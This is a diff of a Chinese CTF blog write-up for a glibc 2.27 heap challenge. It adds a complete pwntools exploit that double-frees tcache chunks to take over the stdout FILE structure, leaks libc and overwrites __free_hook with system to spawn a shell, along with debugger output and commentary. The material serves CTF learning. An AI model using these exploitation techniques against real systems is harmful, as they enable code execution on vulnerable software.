@@ -338,14 +338,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.9k
+                        3.3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        13 分
+                        15 分
                     </div>
                     
                 
@@ -572,7 +572,7 @@ _IO_size_t
 <span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span></code></pre>
 <p>如果进入if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)，无论如何都会进行： f-&gt;_IO_write_base = f-&gt;_IO_write_ptr，所以下面的_IO_do_write 的to_do等于0不会执行输出，所以这里我觉得_IO_new_file_overflow 无法进行泄露<br>所以可以设置f-&gt;_flags绕过那个大的代码块。<br>进入_IO_do_write ，只要_IO_write_base小于_IO_write_ptr 就会将_IO_write_base指向的数据输出，但是里面有一个_IO_SYSSEEK，如果(fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)则不进行write的系统调用</p>
 <ul>
-<li><strong>pwn！：所以要实现地址泄露，如果能控制FILE结构体就只要构造：</strong><ul>
+<li><strong>pwn\！：所以要实现地址泄露，如果能控制FILE结构体就只要构造：</strong><ul>
 <li>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base，_IO_write_base指向目标地址进行泄露</li>
 <li>_flags用stdout本身的就行    </li>
 </ul>
@@ -743,6 +743,88 @@ fd: 0x00
             pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
         <span class="token keyword">except</span><span class="token punctuation">:</span>
             sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h3 id="Official-EXP"><a href="#Official-EXP" class="headerlink" title="Official EXP"></a>Official EXP</h3><p>其实这题应该是我的思路狭窄了，只想到了unsortedbin chunk获取libc地址，在关闭缓冲区时，其实bss段中的全局变量就已经包含了libc地址，所以最恰当的做法是double free后篡改链表到bss段<br>获取stdout_chunk,泄露libc，再次double free向free_hook写入system</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++exp.py++++++++++++++++++++</span>
+<span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+<span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span>
+<span class="token comment" spellcheck="true">#Author: Squarer</span>
+<span class="token comment" spellcheck="true">#Time: 2020.11.25 19.48.14</span>
+<span class="token comment" spellcheck="true">#+++++++++++++++++++exp.py++++++++++++++++++++</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">from</span> FILE <span class="token keyword">import</span><span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show_addr</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'The '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' Addr:'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+host <span class="token operator">=</span> <span class="token string">'1.1.1.1'</span>
+port <span class="token operator">=</span> <span class="token number">10000</span>
+local <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">if</span> local<span class="token punctuation">:</span>
+    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/glibc/x64/2.27/lib/libc-2.27.so'</span><span class="token punctuation">)</span>
+    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#sh = process('./IO_FILE')</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
+    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#sh = remote('axb.d0g3.cn',20102)</span>
+
+<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token comment" spellcheck="true">#usefull : add delete </span>
+    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x602080</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'\x40'</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'\x40'</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x58'</span>
+    <span class="token comment" spellcheck="true">#gdb.attach(sh,'b*new_do_write')</span>
+    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+    libc_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span>
+    free_hook <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+    system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+    show_addr<span class="token punctuation">(</span><span class="token string">'libc_addr'</span><span class="token punctuation">,</span>libc_addr<span class="token punctuation">)</span>
+    show_addr<span class="token punctuation">(</span><span class="token string">'free_hook'</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
+    show_addr<span class="token punctuation">(</span><span class="token string">'system_addr'</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x50'</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
+            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>但是用这个方法的时候遇到一个小问题：<br>前面malloc获得_IO_2_1_stdout的chunk后rsi就是0xfbad2887然而在调用printf的时候进入vfprintf并没有执行，也就是没有输出，当时我以为是我脚本的问题，就没用这个方法了</p>
+<pre class=" language-java"><code class="language-java"> ► <span class="token number">0x400951</span> <span class="token operator">&lt;</span>add<span class="token operator">+</span><span class="token number">345</span><span class="token operator">></span>    call   printf<span class="token annotation punctuation">@plt</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span>
+        format<span class="token operator">:</span> <span class="token number">0x400ba5</span> <span class="token operator">&lt;</span>— <span class="token string">'description:'</span>
+        vararg<span class="token operator">:</span> <span class="token number">0xfbad2887</span></code></pre>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
 <li>读源码是是一个好习惯，之前都没怎么理解这些构造方法，不能仅仅就看看大佬的文章</li>
 <li>这个题除了IO_FILE攻击还有就是tcache 的free chunk转移：篡改其size，使其free后放入另一个链表，从2019_realloc_magic获得的启发<ul>
@@ -1146,7 +1228,7 @@ seccommpshort for secure computing mode(wiki)是一种限</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">121.3k</span>
+                <span class="white-color">121.7k</span>
             
 
             
